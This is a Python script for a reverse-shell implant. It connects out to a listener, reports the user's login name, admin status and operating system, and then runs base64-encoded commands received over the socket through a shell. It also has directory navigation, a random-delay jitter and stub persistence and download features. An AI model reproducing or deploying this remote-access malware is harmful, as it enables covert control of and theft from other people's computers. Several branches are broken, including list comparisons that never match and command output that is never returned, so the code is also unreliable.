# /usr/bin/python3
import ctypes
import os
import platform
import socket
import subprocess
import time
import base64
from time import sleep
from random import randint


def inbound():
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return message
        except Exception:
            sock.close()


def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding="utf-8"))
    sock.send(response)


def session_handler():
    try:
        sock.connect((host_ip, host_port))
        outbound(os.getlogin())
        outbound(ctypes.windll.shell32.IsUserAnAdmin())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = f'{op_sys[0]} {op_sys[2]}'
        outbound(op_sys)
        while True:
            message = inbound()
            if message == 'exit':
                sock.close()
                break
            elif message == ['persist' or 'pt']:
                pass
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('[-] Invalid Directory')
                    continue
            elif message.split(" ")[0] == 'ls':
                list_dir = os.listdir()
                outbound(list_dir)
            elif message in ['background' or 'bg']:
                pass
            elif message == ['help' or 'h']:
                pass
            elif message == ['clear' or 'cls']:
                pass
                continue

            # Work in progress
            elif message == 'download':
                file_dl = message.strip('download ')
                if os.path.exists(file_dl):
                    exists = "yes"
                    outbound(exists)
                else:
                    exists = "no"
                    outbound(exists)
                    continue

            else:
                command = subprocess.Popen(message,
                                           shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                if command == "":
                    output = command.stdout.read() + command.stderr.read()
                    outbound(output.decode())
    except ConnectionRefusedError:
        pass

def jitter():
    delay = randint(5,20)
    return sleep(delay)
    

if __name__ == "__main__":
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host_ip = '127.0.0.1'
        host_port = 2222
        session_handler()
    except ConnectionRefusedError:
        jitter()
        